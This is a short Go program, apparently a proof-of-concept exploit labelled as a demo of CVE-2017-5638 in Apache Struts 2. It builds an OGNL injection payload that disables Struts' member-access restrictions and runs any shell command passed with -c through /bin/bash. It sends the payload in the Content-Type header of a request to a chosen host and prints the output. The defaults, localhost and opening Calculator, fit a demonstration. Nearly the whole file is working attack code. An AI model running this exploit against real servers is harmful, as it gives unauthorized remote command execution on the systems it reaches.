package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

const payload = "%%{(#_='multipart/form-data')." +
	"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
	"(#_memberAccess?(#_memberAccess=#dm):" +
	"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
	"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
	"(#ognlUtil.getExcludedPackageNames().clear())." +
	"(#ognlUtil.getExcludedClasses().clear())." +
	"(#context.setMemberAccess(#dm))))." +
	"(#cmds=({'/bin/bash','-c', '%s'}))." +
	"(#p=new java.lang.ProcessBuilder(#cmds))." +
	"(#p.redirectErrorStream(true)).(#process=#p.start())." +
	"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." +
	"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." +
	"(#ros.flush())}"

func main() {
	var host = flag.String("h", "http://localhost:8080", "The host to analyze")
	var cmd = flag.String("c", "open /Applications/Calculator.app", "The command to execute")
	flag.Parse()

	fmt.Println("CVE-2017-5638 Demo")
	if flag.NFlag() == 0 {
		flag.PrintDefaults()
	}

	var client = &http.Client{
		Timeout: time.Second * 10,
	}
	req, _ := http.NewRequest("GET", *host, nil)
	loaded := fmt.Sprintf(payload, *cmd)
	req.Header.Add("Content-Type", loaded)
	response, _ := client.Do(req)

	body, _ := ioutil.ReadAll(response.Body)
	fmt.Println("--------- Response ---------")
	fmt.Println(string(body))
}
